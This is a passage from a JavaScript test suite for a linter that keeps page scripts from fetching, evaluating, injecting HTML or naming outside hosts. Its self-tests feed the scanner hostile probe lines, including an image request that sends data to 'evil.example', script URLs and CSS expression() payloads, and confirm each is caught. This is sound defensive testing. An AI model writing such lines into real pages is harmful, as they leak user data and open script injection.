    const scheme = m[1].toLowerCase(), host = m[2].toLowerCase();
    if (scheme !== "https" || !FONT_HOSTS.includes(host)) out.push(`${path}:${lineOf(src, m.index)}: ${m[0]} (the only hosts a page names are ${FONT_HOSTS.join(" and ")}, over https)`);
  }
  for (const tag of parseHtml(src).tags) {
    const where = `${path}:${lineOf(src, tag.index)}`;
    for (const [name, value] of tag.attrs) {
      if (value === null) continue;
      const v = value.trim();
      if (/^[\\/]{2}/.test(v)) out.push(`${where}: ${name}="${v}" names a host without a scheme`);
      if (/^(?:java|vb)script\s*:/i.test(v.replace(/[\s\0]/g, ""))) out.push(`${where}: ${name} is a script URL`);
      if (/url\(\s*["']?\s*[\\/]{2}/i.test(v)) out.push(`${where}: ${name} has a url() that names a host without a scheme`);
    }
    if (tag.name === "style" && /(?:url\(|@import)\s*["']?\s*[\\/]{2}/i.test(tag.body || "")) out.push(`${where}: the style sheet names a host without a scheme`);
  }
  return out;
}

const PAGE_RULES = [
  ["the content policy line is first in the head", policyProblems],
  ["no on… attribute", handlerProblems],
  ["exactly one module script with a relative src, and no inline script", scriptProblems],
  ["no host but the two font hosts", hostProblems],
];

// ---------------------------------------------------------------- rule 3: ids

const ID_LITERAL = /(?<![\w$])(?:\$|document\s*\.\s*getElementById)\s*\(\s*(["'`])([^"'`\\$\n]*)\1\s*\)/g;
const ID_PROPERTY = /(?<![\w$.])(?:id|"id"|'id')\s*:\s*(?:(["'])([^"'\\\n]*)\1(\s*\+)?|`([^`$\\]*)(`|\$\{))/g;
const H_CALL = /(?<![\w$.])h\s*\(/g;

// The ids a script gives in its h(...) calls: `exact` ids, and `prefixes` of ids built as a literal plus something.
function idsGivenBy(src) {
  const { kind, text, code } = viewsOfJs(src);
  const exact = new Set(), prefixes = new Set();
  for (const call of code.matchAll(H_CALL)) {
    let j = call.index + call[0].length, depth = 1;
    while (j < code.length && depth > 0) { if (code[j] === "(") depth++; else if (code[j] === ")") depth--; j++; }
    const from = call.index, slice = text.slice(from, j);
    for (const m of slice.matchAll(ID_PROPERTY)) {
      const at = from + m.index;
      if (at > 0 && kind[at - 1] === STRING) continue;   // the words "id:" inside a string
      const quoted = m[2] !== undefined;
      const value = quoted ? m[2] : m[4];
      const whole = quoted ? !m[3] : m[5] === "`";
      if (value === "") continue;
      (whole ? exact : prefixes).add(value);
    }
  }
  return { exact, prefixes };
}
function idsOfHtml(src) {
  const ids = new Set();
  for (const tag of parseHtml(src).tags) { const id = attr(tag, "id"); if (id) ids.add(id); }
  return ids;
}
// scripts: [{ path, src }] of one page; givers: the same plus the kit; htmlSrc: the page's index.html.
function idProblems(scripts, htmlSrc, givers) {
  const inPage = idsOfHtml(htmlSrc), exact = new Set(), prefixes = new Set();
  for (const g of givers) { const got = idsGivenBy(g.src); got.exact.forEach((v) => exact.add(v)); got.prefixes.forEach((v) => prefixes.add(v)); }
  const out = [];
  for (const { path, src } of scripts) {
    const { kind, text } = viewsOfJs(src);
    for (const m of text.matchAll(ID_LITERAL)) {
      if (kind[m.index] !== CODE) continue;
      const id = m[2];
      if (inPage.has(id) || exact.has(id) || [...prefixes].some((p) => id.startsWith(p))) continue;
      out.push(`${path}:${lineOf(src, m.index)}: no element with id "${id}" in the page's index.html or in an h(..., { id }) call`);
    }
  }
  return out;
}

// ---------------------------------------------------------------- rule 4: links

// Returns { problems, pending }: pending are targets that are page files not written yet.
function linkProblems(links, exists = present, pendingOk = (rel) => stateOf(rel, exists) === "pending") {
  const problems = [], pending = [], reached = new Set();
  if (!links || typeof links !== "object" || !Object.isFrozen(links)) return { problems: ["LINKS is not a frozen object"], pending };
  const root = resolve(ROOT);
  for (const [key, value] of Object.entries(links)) {
    if (!isRelativeUrl(value) || /[#?]/.test(value)) { problems.push(`LINKS.${key} is not a plain relative URL`); continue; }
    for (const page of PAGES) {
      const rel = posix(relative(root, resolve(root, ...page.dir.split("/"), ...value.split("/"))));
      if (rel === "" || rel.startsWith("..") || isAbsolute(rel)) { problems.push(`LINKS.${key} leads out of the repository from ${page.dir}`); continue; }
      reached.add(rel);
      if (exists(rel)) continue;
      if (pendingOk(rel)) { if (!pending.includes(rel)) pending.push(rel); continue; }
      problems.push(`LINKS.${key} = "${value}" resolves from ${page.dir} to ${rel}, which does not exist`);
    }
  }
  for (const target of LINK_TARGETS) if (!reached.has(target)) problems.push(`LINKS no longer leads to ${target}`);
  return { problems, pending };
}

// ---------------------------------------------------------------- rule 5: the package First Explorers saves

const FIRST_EXPLORERS = `${WING}/First_Explorers/first-explorers.js`;
const WIRE_TEXT = "JSON.stringify(pack())";
// The arguments of the call whose "(" is at `open`, each as its text, cut at the commas of the call's own level.
// Brackets and commas are counted in the program text only (`code`), so those inside a string do not count.
function argumentsAt(src, code, open) {
  const args = [];
  let depth = 0, from = open + 1;
  for (let i = open; i < code.length; i++) {
    const c = code[i];
    if (c === "(" || c === "[" || c === "{") depth++;
    else if (c === ")" || c === "]" || c === "}") {
      if (--depth > 0) continue;
      const last = src.slice(from, i).trim();
      if (last !== "" || args.length) args.push(last);
      return args;
    } else if (c === "," && depth === 1) { args.push(src.slice(from, i).trim()); from = i + 1; }
  }
  return args;
}
// What is saved under a name that begins "hyperpack-" must be the wire text, and download() must write the text
// it is given and nothing else.
function savedPackageProblems(path, src) {
  const { code } = viewsOfJs(src);
  const out = [];
  let saves = 0;
  for (const m of code.matchAll(/(?<![\w$.])download\s*\(/g)) {
    if (/function\s+$/.test(code.slice(0, m.index))) continue;   // the function itself, read below
    const args = argumentsAt(src, code, m.index + m[0].length - 1);
    if (!/^[`"']hyperpack-/.test(args[0] || "")) continue;
    saves++;
    const text = (args[1] || "").replace(/\s+/g, "");
    if (args.length !== 2 || text !== WIRE_TEXT) {
      out.push(`${path}:${lineOf(src, m.index)}: the package must be saved as its wire text, ${WIRE_TEXT} with no indentation (the load box of the Lexicon Explorer reads no other form); it is saved as ${args.slice(1).join(", ") || "nothing"}`);
    }
  }
  if (saves === 0) out.push(`${path}: no download(\`hyperpack-…\`, …) call: the rule no longer finds where the package is saved`);
  const def = /(?<![\w$.])function\s+download\s*\(\s*[A-Za-z_$][\w$]*\s*,\s*([A-Za-z_$][\w$]*)\s*\)\s*\{/.exec(code);
  if (!def) return [...out, `${path}: no function download(name, text)`];
  let depth = 0, end = def.index + def[0].length - 1;
  for (; end < code.length; end++) { if (code[end] === "{") depth++; else if (code[end] === "}" && --depth === 0) break; }
  const body = code.slice(def.index + def[0].length, end), given = def[1].replace(/\$/g, "\\$");
  if (/(?<![\w$])JSON(?![\w$])/.test(body) || !new RegExp(`(?<![\\w$])new\\s+Blob\\s*\\(\\s*\\[\\s*${given}\\s*\\]`).test(body)) {
    out.push(`${path}:${lineOf(src, def.index)}: download() must write the text it is given, new Blob([${def[1]}], …), and not make its own JSON of it`);
  }
  return out;
}

// ---------------------------------------------------------------- the tests

const report = (problems) => `${problems.length} problem${problems.length === 1 ? "" : "s"}:\n` + problems.join("\n");

// Every file the rules read: the kit, the cores, the listed page files, and whatever else is in a page folder.
const LISTED = [KIT, ...CORES, ...PAGES.flatMap(listedOf)];
const EXTRA = PAGES.flatMap((page) => unlisted(listedOf(page), foundIn(page.dir)));

test("the lists name files of this repository", () => {
  assert.ok(present(KIT), missingNote(KIT));
  for (const core of CORES) assert.ok(present(core), missingNote(core));
  assert.equal(new Set(LISTED).size, LISTED.length, "a file is listed twice");
  assert.equal(new Set(FORBIDDEN.map((r) => r.name)).size, FORBIDDEN.length, "a forbidden name is listed twice");
  const every = [...FORBIDDEN, ...SCRIPT_RULES].map((r) => r.name);
  assert.equal(new Set(every).size, every.length, "a rule is listed twice");
  for (const rule of SCRIPT_RULES) for (const file of Object.keys(rule.allow || {})) assert.ok(present(file), `${rule.name}: the file it allows for does not exist: ${file}`);
});

for (const rel of [...LISTED, ...EXTRA]) {
  test(`forbidden names: ${rel}`, (t) => {
    const state = stateOf(rel);
    if (state === "pending") return t.skip(pendingNote(rel));
    assert.notEqual(state, "missing", missingNote(rel));
    const problems = forbiddenIn(rel, read(rel));
    assert.deepEqual(problems, [], report(problems));
  });
}

for (const page of PAGES) {
  const index = `${page.dir}/${page.index}`;
  const pages = [index, ...unlisted([index], foundIn(page.dir).filter((f) => /\.html?$/i.test(f)))];
  for (const rel of pages) {
    for (const [title, rule] of PAGE_RULES) {
      test(`${rel}: ${title}`, (t) => {
        const state = stateOf(rel);
        if (state === "pending") return t.skip(pendingNote(rel));
        assert.notEqual(state, "missing", missingNote(rel));
        const problems = rule(rel, read(rel));
        assert.deepEqual(problems, [], report(problems));
      });
    }
  }

  test(`${page.name}: every $("id") literal has its element`, (t) => {
    if (stateOf(index) === "pending") return t.skip(pendingNote(index));
    assert.ok(present(index), missingNote(index));
    const scripts = foundIn(page.dir).filter((f) => /\.(m?js|cjs)$/i.test(f)).map((path) => ({ path, src: read(path) }));
    const problems = idProblems(scripts, read(index), [...scripts, { path: KIT, src: read(KIT) }]);
    assert.deepEqual(problems, [], report(problems));
  });
}

test("the kit loads without a document, and every value of LINKS resolves to an existing file", async (t) => {
  assert.equal(typeof globalThis.document, "undefined", "this test must run without a document");
  const kit = await import(pathToFileURL(abs(KIT)).href);
  for (const name of ["LINKS", "LAYER_META", "parseHashWith", "formatHashWith", "cutLabel"]) assert.ok(name in kit, `the kit does not export ${name}`);
  const { problems, pending } = linkProblems(kit.LINKS);
  assert.deepEqual(problems, [], report(problems));
  if (pending.length) t.skip(`the other targets exist; not written yet: ${pending.join(", ")}`);
});

test("the kit's style rule: text that could name a resource is refused in every spelling, and plain style text passes", async () => {
  const kit = await import(pathToFileURL(abs(KIT)).href);
  assert.equal(typeof kit.isAllowedStyleText, "function", "the kit exports isAllowedStyleText");
  const B = "//example.org/x.png";
  const refused = [
    ["url(", `background:url(${B})`], ["url( in capitals", `background:URL(${B})`], ["url (", `background: url ("${B}")`],
    ["an escaped u", `background:\\75rl(${B})`], ["an escaped r", `background:u\\72l(${B})`], ["an escaped l, six digits", `background:ur\\00006c(${B})`],
    ["an escaped letter that needs no escape", `background:u\\rl(${B})`], ["a backslash and nothing else", "content:'\\'"],
    ["image-set(", `background-image:image-set("${B}" 1x)`], ["image-set( in capitals", `background-image:IMAGE-SET("${B}" 1x)`],
    ["-webkit-image-set(", `background-image:-webkit-image-set("${B}" 1x)`], ["image-set (", `background-image:image-set ("${B}" 1x)`],
    ["image(", `background-image:image("${B}")`], ["src(", `background-image:src("${B}")`],
    ["@import", `@import "${B}"`], ["expression(", "width:expression(alert(1))"], ["a script URL", "background:javascript:alert(1)"],
    ["a cursor", `cursor:url(${B}), auto`], ["a list marker", `list-style:url(${B})`], ["a filter", "filter:url(#f)"],
    // the values of a style object go through the same rule
    ["a value: image-set", `image-set("${B}" 1x)`], ["a value: an escape", `\\75rl(${B})`],
  ];
  for (const [what, text] of refused) assert.equal(kit.isAllowedStyleText(text), false, what);
  for (const x of [undefined, null, 5, true, {}, [], ["color:red"]]) assert.equal(kit.isAllowedStyleText(x), false, "only a string is style text");
  const allowed = [
    "", "color:red", "padding-left: 30px", "--c:#fbbf24", "margin-bottom:7px", "white-space:pre-wrap", "background-image: linear-gradient(90deg, #000, #fff)",
    "transform: translate(3px, 4px) rotate(10deg)", "width: calc(100% - 2rem)", "color: var(--gold)", "font-family: Inter, sans-serif", "30px", "#94a3b8",
    "background: rgb(0 0 0 / 50%)", "grid-template-columns: repeat(2, minmax(0, 1fr))", "content: 'an image, a source, a curl'",
  ];
  for (const text of allowed) assert.equal(kit.isAllowedStyleText(text), true, text);
  // h() itself asks this rule, for the text form and for every value of the object form, and nothing else decides
  const src = read(KIT), setStyle = src.slice(src.indexOf("function setStyle("), src.indexOf("function appendKids("));
  assert.equal((setStyle.match(/isAllowedStyleText\(/g) || []).length, 2, "setStyle asks the rule for the text and for each value");
  assert.ok(!/UNSAFE_STYLE/.test(setStyle), "and has no second rule of its own");
});

test("First Explorers saves its package as the wire text, the one form the Lexicon Explorer's load box reads", () => {
  assert.ok(present(FIRST_EXPLORERS), missingNote(FIRST_EXPLORERS));
  const problems = savedPackageProblems(FIRST_EXPLORERS, read(FIRST_EXPLORERS));
  assert.deepEqual(problems, [], report(problems));
});

// ---------------------------------------------------------------- self-tests: every rule can fail

const names = (problems) => problems.map((p) => p.replace(/^[^:]+:\d+: /, "").replace(/ \(found .*$/s, ""));

test("self-test: every forbidden name is caught, and comments and sentences are told from code", () => {
  for (const rule of FORBIDDEN) {
    const { name, where, sample } = rule;
    assert.deepEqual(names(forbiddenIn("x.js", `const a = 1;\n${sample}\n`)), [name], `${name}: not caught, or caught as something else`);
    assert.match(forbiddenIn("x.js", `const a = 1;\n\n${sample}\n`)[0], /^x\.js:3: /, `${name}: wrong line number`);
    const inLine = forbiddenIn("x.js", `const a = 1; // ${sample}\n`), inBlock = forbiddenIn("x.js", `/* ${sample}\n */\nconst a = 1;\n`);
    const inString = forbiddenIn("x.js", `const a = ${JSON.stringify(sample)};\n`), inTemplate = forbiddenIn("x.js", "const a = `" + sample.replace(/[`$\\]/g, "") + "`;\n");
    if (where === "all") {
      assert.equal(inLine.length, 1, `${name}: must be caught in a line comment too`);
      assert.equal(inBlock.length, 1, `${name}: must be caught in a block comment too`);
    } else {
      assert.deepEqual(inLine, [], `${name}: a line comment is not code`);
      assert.deepEqual(inBlock, [], `${name}: a block comment is not code`);
    }
    if (where === "code") {
      assert.deepEqual(inString, [], `${name}: a sentence in a string is not code`);
      assert.deepEqual(inTemplate, [], `${name}: template text is not code`);
      assert.equal(forbiddenIn("x.js", "const a = `${" + sample.replace(/;$/, "") + "}`;\n").length, 1, `${name}: the code inside \${...} is code`);
    } else {
      assert.equal(inString.length, 1, `${name}: must be caught inside a string too`);
      assert.equal(inTemplate.length, 1, `${name}: must be caught inside a template too`);
    }
  }
});

test("self-test: forbidden names next to them are not caught", () => {
  const sound = [
    "import { h } from \"../explorer-kit.js\";",
    "const fetched = fetchRows(1), evaluate = 2, cookies = 3, escape = 4, escaped = 5, local = 6, storage = 7;",
    "const say = \"We do not fetch, eval or keep a cookie. Press Esc. Nothing is put in browser storage.\";",
    "if (typeof say === \"function\") say();",
    "const meta = import.meta.url, caches = new Map(); caches.has(1); caches.delete(1);",
    "el.textContent = say; el.setAttribute(\"src\", \"x\");",
    "",
  ].join("\n");
  assert.deepEqual(forbiddenIn("x.js", sound), []);
});

test("self-test: the scanner keeps its place after regular expressions, templates and division", () => {
  const tricky = [
    "const q = /[\"'`/]/g, r = a / b / c;            // innerHTML",
    "const t = `one ${ two(`three ${ four } \"`) } five 'six`;",
    "const u = x ? /* eval( */ 1 : 2, v = \"a\\\"b // not a comment\";",
    "el.innerHTML = t;",
    "const w = `${ `${ fetch(u) }` }`;",
    "const y = n++ / 2 + eval(s) / 3, z = s.replace(/\\/\\/+/g, \"/\").split(/[/\\]]/); // fetch(u)",
    "const k = s.match(/a/) ? cookie / 2 : 0;",
    "",
  ].join("\n");
  assert.deepEqual(forbiddenIn("x.js", tricky).map((p) => p.replace(/ \(found .*$/, "")), ["x.js:4: innerHTML", "x.js:6: eval", "x.js:5: fetch", "x.js:7: cookie"]);
});

// The page-script rules, on a script that would sit in a page folder.
const IN_PAGE = `${PAGES[1].dir}/x.js`;

test("self-test: every page-script rule is caught where it applies, told from comments and sentences, and passes the lines next to it", () => {
  for (const rule of SCRIPT_RULES) {
    const { name, where, start, sample, sound } = rule;
    assert.deepEqual(names(forbiddenIn(IN_PAGE, `const a = 1;\n${sample}\n`)), [name], `${name}: not caught, or caught as something else`);
    assert.match(forbiddenIn(IN_PAGE, `const a = 1;\n\n${sample}\n`)[0], /:3: /, `${name}: wrong line number`);
    assert.deepEqual(forbiddenIn(IN_PAGE, `const a = 1; // ${sample}\n`), [], `${name}: a line comment is not code`);
    assert.deepEqual(forbiddenIn(IN_PAGE, `/* ${sample}\n */\nconst a = 1;\n`), [], `${name}: a block comment is not code`);
    const inString = forbiddenIn(IN_PAGE, `const a = ${JSON.stringify(sample)};\n`), inTemplate = forbiddenIn(IN_PAGE, "const a = `" + sample.replace(/[`$\\]/g, "") + "`;\n");
    if (where === "code" || start) {
      assert.deepEqual(inString, [], `${name}: a sentence in a string is not code`);
      assert.deepEqual(inTemplate, [], `${name}: template text is not code`);
      assert.equal(forbiddenIn(IN_PAGE, "const a = `${" + sample.replace(/;$/, "") + "}`;\n").length, 1, `${name}: the code inside \${...} is code`);
    } else {
      assert.equal(inString.length, 1, `${name}: must be caught inside a string too`);
      assert.equal(inTemplate.length, 1, `${name}: must be caught inside a template too`);
    }
    assert.ok(Array.isArray(sound) && sound.length >= 1, `${name}: no line that must pass`);
    assert.deepEqual(forbiddenIn(IN_PAGE, sound.join("\n") + "\n"), [], `${name}: a line next to the rule is caught`);
    // where the rule applies: every script of a page folder and every core; the kit only when marked; nothing else
    for (const rel of [`${PAGES[0].dir}/x.js`, `${PAGES[1].dir}/deeper/x.mjs`, ...CORES]) assert.deepEqual(names(forbiddenIn(rel, sample + "\n")), [name], `${name}: not caught in ${rel}`);
    assert.deepEqual(names(forbiddenIn(KIT, sample + "\n")), rule.kit ? [name] : [], `${name}: the kit`);
    assert.deepEqual(forbiddenIn("x.js", sample + "\n"), [], `${name}: a script outside the pages and the cores`);
    assert.deepEqual(forbiddenIn(`${PAGES[0].dir}/p.html`, sample + "\n"), [], `${name}: a page file has no script to read`);
  }
});

test("self-test: the page-script rules catch every line of a function that works round the kit", () => {
  const probe = [
    "function probe(fromLexicon) {",
    "  const a = document.createElement(\"a\");",
    "  a.setAttribute(\"href\", fromLexicon);",
    "  a.href = fromLexicon;",
    "  const s = document.createElement(\"script\");",
    "  s.src = fromLexicon;",
    "  location.href = fromLexicon;",
    "  location.assign(fromLexicon);",
    "  window.open(fromLexicon);",
    "  setTimeout(\"alert(1)\", 0);",
    "  setInterval(fromLexicon, 1000);",
    "  addEventListener(\"message\", (e) => probe(e.data));",
    "  parent.postMessage(fromLexicon, \"*\");",
    "  navigator.clipboard.writeText(fromLexicon);",
    "  new Worker(fromLexicon);",
    "  a.setAttribute(\"onclick\", fromLexicon);",
    "  a.setAttribute(name, fromLexicon);",
    "  a.style.cssText = fromLexicon;",
    "  a.className = fromLexicon; a.id = fromLexicon;",
    "  new Image().src = \"https://evil.example/?\" + fromLexicon;",
    "  window.location = fromLexicon; document.location.replace(fromLexicon); top.location.href += fromLexicon;",
    "  const u = \"//evil.example/x\";",
    "}",
    "",
  ].join("\n");
  const caught = new Set(forbiddenIn(IN_PAGE, probe).map((p) => Number(/:(\d+): /.exec(p)[1])));
  const lines = probe.split("\n").length - 1;
  for (let n = 2; n < lines; n++) assert.ok(caught.has(n), `line ${n} of the probe is not caught: ${probe.split("\n")[n - 1].trim()}`);
  assert.ok(!caught.has(1) && !caught.has(lines), "the function's own first and last line are sound");
  assert.deepEqual(forbiddenIn("x.js", probe), [], "outside the pages only the forbidden names apply");
});

test("self-test: the page-script rules catch the ways round the kit that they can see", () => {
  const probe = [
    "function probe(entry, link, el, box) {",
    "  Object.assign(link, { href: entry.text, target: \"_blank\" });",
    "  Object.assign(el.style, { backgroundImage: entry.text });",
    "  Object.assign(state.link, entry);",
    "  el.style.backgroundImage = \"url(\" + entry.text + \")\";",
    "  el.style.color = entry.color; el.style.widthy = entry.text;",
    "  el.style.setProperty(\"background\", entry.text);",
    "  const css = el.style; css.setProperty(\"background\", entry.text);",
    "  el.classList.add(entry.kind);",
    "  el.classList.add(\"row\", entry.kind);",
    "  el.classList.toggle(entry.kind, true);",
    "  el.classList.replace(\"row\", entry.kind);",
    "  el.classList.add(`row ${entry.kind}`);",
    "  box.setHTMLUnsafe(entry.text);",
    "  box.setHTML(entry.text);",
    "  const doc = Document.parseHTMLUnsafe(entry.text);",
    "  link.host = entry.host;",
    "  link.hostname = entry.host;",
    "  link.protocol = entry.text;",
    "  link.pathname = entry.text;",
    "  link.search += entry.text;",
    "  window.navigation.navigate(entry.text);",
    "  navigation.navigate(entry.text);",
    "  el.classList.value = entry.kind;",
    "  el.classList.value += \" \" + entry.kind;",
    "  el.classList.value = \"row \" + entry.kind;",
    "  el.classList.value = `row ${entry.kind}`;",
    "  el.classList = entry.kind;",
    "  el.classList.value = \"row\"",
    "    + entry.kind;",
    "  link.attributes.href.value = entry.text;",
    "  link.attributes[\"href\"].value = entry.text;",
    "  link.attributes[0].value = entry.text;",
    "  link . attributes . getNamedItem(\"href\").value = entry.text;",
    "  link.attributes.setNamedItem(entry.attr);",
    "}",
    "",
  ].join("\n");
  const caught = new Set(forbiddenIn(IN_PAGE, probe).map((p) => Number(/:(\d+): /.exec(p)[1])));
  const lines = probe.split("\n").length - 1;
  for (let n = 2; n < lines; n++) if (!/^\s+\+ /.test(probe.split("\n")[n - 1])) assert.ok(caught.has(n), `line ${n} of the probe is not caught: ${probe.split("\n")[n - 1].trim()}`);
  assert.ok(!caught.has(1) && !caught.has(lines), "the function's own first and last line are sound");
  // the two new rules bind the kit as well, where the class attribute is otherwise set by h() alone
  for (const line of ["el.classList.value = kind;", "el.classList = kind;", "link.attributes.href.value = u;", "link.attributes[\"href\"].value = u;"]) assert.equal(forbiddenIn(KIT, line + "\n").length, 1, `the kit: ${line}`);
  assert.deepEqual(forbiddenIn(KIT, "if (name === \"class\") el.className = String(value);\nel.classList.add(\"seg\", \"lens-switch\"); box.classList.toggle(\"open\", on);\n"), [], "h() sets the class attribute, and the kit names its own classes");
});

test("self-test: optional chaining is read as the member or the call it stands for, in every rule", () => {
  const probe = [
    "function probe(entry, link, el, box) {",
    "  navigation?.navigate(entry.text);",
    "  window?.navigation?.navigate(entry.text);",
    "  navigation.navigate?.(entry.text);",
    "  el.classList?.add(entry.kind);",
    "  el?.classList?.toggle(entry.kind, true);",
    "  el.classList.add?.(entry.kind);",
    "  el.classList?.replace?.(\"row\", entry.kind);",
    "  Object?.assign(link, { href: entry.text });",
    "  Object.assign?.(link, { href: entry.text });",
    "  el.style?.setProperty(\"background\", entry.text);",
    "  el.style.setProperty?.(\"background\", entry.text);",
    "  box?.setHTML(entry.text);",
    "  box.setHTML?.(entry.text);",
    "  link.attributes?.setNamedItem(entry.attr);",
    "  link?.attributes?.[\"href\"]?.value.at(0);",
    "  el?.setAttribute(\"href\", entry.text);",
    "  el.setAttribute?.(\"href\", entry.text);",
    "  window?.open(entry.text);",
    "  window.open?.(entry.text);",
    "  location?.assign(entry.text);",
    "  location.replace?.(entry.text);",
    "  setTimeout?.(entry.text, 0);",
    "  window?.setInterval(entry.text, 1000);",
    "  window?.addEventListener?.(\"message\", (e) => probe(e.data));",
    "  parent?.postMessage?.(entry.text, \"*\");",
    "  navigator?.clipboard?.readText?.();",
    "  document?.write(entry.text);",
    "  document?.createElement?.(\"a\");",
    "  navigator?.storage?.persist();",
    "  caches?.open?.(entry.text);",
    "}",
    "",
  ].join("\n");
  const caught = new Set(forbiddenIn(IN_PAGE, probe).map((p) => Number(/:(\d+): /.exec(p)[1])));
  const lines = probe.split("\n").length - 1;
  for (let n = 2; n < lines; n++) assert.ok(caught.has(n), `line ${n} of the probe is not caught: ${probe.split("\n")[n - 1].trim()}`);
  assert.ok(!caught.has(1) && !caught.has(lines), "the function's own first and last line are sound");
  // each line is caught by the rule that catches its plain spelling, at the same place
  for (const line of probe.split("\n").slice(1, -2)) {
    const plain = line.replace(/\?\.(?=[([])/g, "").replace(/\?\./g, ".");
    assert.deepEqual(names(forbiddenIn(IN_PAGE, line + "\n")), names(forbiddenIn(IN_PAGE, plain + "\n")), line.trim());
    assert.ok(forbiddenIn(IN_PAGE, plain + "\n").length >= 1, plain.trim());
  }
  assert.match(forbiddenIn(IN_PAGE, "const a = 1;\n\nnavigation?.navigate(u);\n")[0], /:3: navigation\.navigate/, "the line number holds");
  assert.equal(plainChain("a?.b(c?.[0], f?.(x), g?. (y)) ? on ?.5 : 1"), "a .b(c  [0], f  (x), g   (y)) ? on ?.5 : 1", "two characters for two: no offset moves, and a number after a question mark is left alone");
  // sound lines with optional chaining pass, and a choice with a number after it is no chain
  const sound = [
    "const n = row?.cells?.length ?? 0, label = entry?.name, first = list?.[0], half = on ?.5 : 1; done?.(n);",
    "dialogs.about?.open(button); el?.setAttribute(\"aria-pressed\", \"true\"); el.classList?.toggle(\"open\", on); box?.classList.add?.(\"seg\", \"many\");",
    "const t = setTimeout?.(() => go(), 100); Object?.assign(state, next); const o = Object.assign?.({}, a); canvas.style.width = (w ?? 0) + \"px\";",
    "const sentence = \"Is it so?.. navigation?.navigate(u) is only said here\"; // el.classList?.add(kind)",
    "",
  ].join("\n");
  assert.deepEqual(forbiddenIn(IN_PAGE, sound), []);
  assert.deepEqual(forbiddenIn(KIT, "const kind = node?.nodeType, open = box?.classList.contains(\"open\");\n"), []);
});

test("self-test: what the page-script rules cannot see, as the head of this file says", () => {
  // If one of these lines is caught one day, the rules have grown: correct the paragraph at the head of this file.
  const unseen = [
    // a member set under a computed name
    "for (const key of [\"href\", \"title\"]) link[key] = entry[key];",
    "img[\"src\"] = entry.text;",
    "el.style [\"color\"] = entry.text;",
    "el[\"classList\"].value = entry.kind; link[\"attributes\"].href.value = entry.text;",
    // a call through another name for window or for a function (or a member of an object kept under another name)
    "const win = window; win.open(entry.text);",
    "const assign = Object.assign; assign(link, { href: entry.text });",
    "const list = el.classList; list.value = entry.kind;",
    "const map = link.attributes; map.href.value = entry.text;",
    // a listed member written to with no assignment sign after it, and the attribute map taken whole
    "[link.href] = [entry.text]; ({ text: img.src } = entry);",
    "for (link.href of [entry.text]) break;",
    "for (const a of link.attributes) if (a.name === \"href\") a.value = entry.text;",
    // something between a listed name and what its rule expects next
    "(link.href) = entry.text; (el.classList).value = entry.kind; (el.style).color = entry.text; (window).open(entry.text);",
    "window.open.call(window, entry.text); el.setAttribute.call(el, \"href\", entry.text); el.classList.add.apply(el.classList, entry.kinds);",
    "link.href++;",
    "link.hr\\u0065f = entry.text; el.inner\\u0048TML = entry.text;",
    // names that no rule lists
    "document.title = entry.name;",
    "link.download = entry.name + \".json\";",
    "link.port = entry.text; link.hash = entry.text; location.hash = entry.text;",
    "el.attributeStyleMap.set(\"color\", entry.text);",
    "navigator.share({ url: entry.text });",
    "el.attachShadow({ mode: \"open\" }).append(new Text(entry.text));",
    "link.setAttributeNode(entry.attr);",
    "",
  ].join("\n");
  assert.deepEqual(forbiddenIn(IN_PAGE, unseen), []);
  // … and each of these lines in its plain spelling is caught: it is the spelling that hides them, nothing else
  for (const line of ["link.href = entry.href;", "img.src = entry.text;", "el.style.color = entry.text;", "el.classList.value = entry.kind;", "link.attributes.href.value = entry.text;", "window.open(entry.text);", "Object.assign(link, { href: entry.text });"])
    assert.equal(forbiddenIn(IN_PAGE, line + "\n").length, 1, line);
  // … and so is an assignment written with a longer sign
  for (const line of ["link.href ||= entry.href;", "img.src ??= entry.text;", "el.style.color &&= entry.text;", "el.classList.value ||= entry.kind;", "el.id **= 2;", "link.host >>>= 1;", "link.search <<= 1;", "el.className >>= 1;", "el.style &&= entry.text;", "el.style += entry.text;"])
    assert.equal(forbiddenIn(IN_PAGE, line + "\n").length, 1, line);
});

test("self-test: the saved-package rule fails on an indented package, a download that rewrites its text and a missing save", () => {
  const page = (save, body = "const a = h(\"a\", { href: URL.createObjectURL(new Blob([text], { type: \"application/json\" })), download: name });") => [
    "const pack = () => OW.makeHyperpack({ ...bundle(), certificate: S.certificate });",
    "function download(name, text) {",
    "  " + body,
    "  document.body.append(a); a.click(); a.remove();",
    "}",
    "const row = h(\"div\", { class: \"row\" },",
    "  h(\"button\", { onclick: () => " + save + " }, \"Save package\"),",
    "  h(\"button\", { onclick: () => download(\"first-explorers-trace.json\", JSON.stringify(S.trace, null, 1)) }, \"Save ledger\"));",
    "",
  ].join("\n");
  const good = "download(`hyperpack-${S.chain.chainId}.json`, JSON.stringify(pack()))";
  assert.deepEqual(savedPackageProblems("x.js", page(good)), []);
  assert.deepEqual(savedPackageProblems("x.js", page("download(\n    `hyperpack-${S.chain.chainId}.json`,\n    JSON.stringify( pack() ))")), [], "the same call over several lines");
  const bad = [
    ["indented by a number", "download(`hyperpack-${S.chain.chainId}.json`, JSON.stringify(pack(), null, 1))"],
    ["indented by a tab", "download(`hyperpack-${S.chain.chainId}.json`, JSON.stringify(pack(), null, \"\\t\"))"],
    ["a value handed over for download() to spell", "download(`hyperpack-${S.chain.chainId}.json`, pack())"],
    ["a third argument", "download(`hyperpack-${S.chain.chainId}.json`, JSON.stringify(pack()), 1)"],
    ["another text", "download(\"hyperpack-\" + S.chain.chainId + \".json\", pretty(pack()))"],
    ["no save at all", "go()"],
  ];
  for (const [what, save] of bad) assert.equal(savedPackageProblems("x.js", page(save)).length, 1, what);
  assert.match(savedPackageProblems("x.js", page(bad[0][1]))[0], /^x\.js:7: .*JSON\.stringify\(pack\(\), null, 1\)$/, "the line of the call, and what it saves");
  // download() itself: the way the page was written before (it made its own, indented JSON of a value), and other rewrites
  const rewrites = [
    "const a = h(\"a\", { href: URL.createObjectURL(new Blob([JSON.stringify(text, null, 1)], { type: \"application/json\" })), download: name });",
    "const a = h(\"a\", { href: URL.createObjectURL(new Blob([JSON.stringify(JSON.parse(text), null, 2)])), download: name });",
    "const a = h(\"a\", { href: URL.createObjectURL(new Blob([text + \"\\n\"])), download: name });",
    "const a = h(\"a\", { href: URL.createObjectURL(new Blob([name])), download: name });",
  ];
  for (const body of rewrites) assert.equal(savedPackageProblems("x.js", page(good, body)).length, 1, body);
  assert.equal(savedPackageProblems("x.js", page("download(`hyperpack-${S.chain.chainId}.json`, pack())", rewrites[0])).length, 2, "both at once: the page as it was");
  assert.equal(savedPackageProblems("x.js", page(good).replace("function download(name, text)", "function save(name, text)")).length, 1, "no download function");
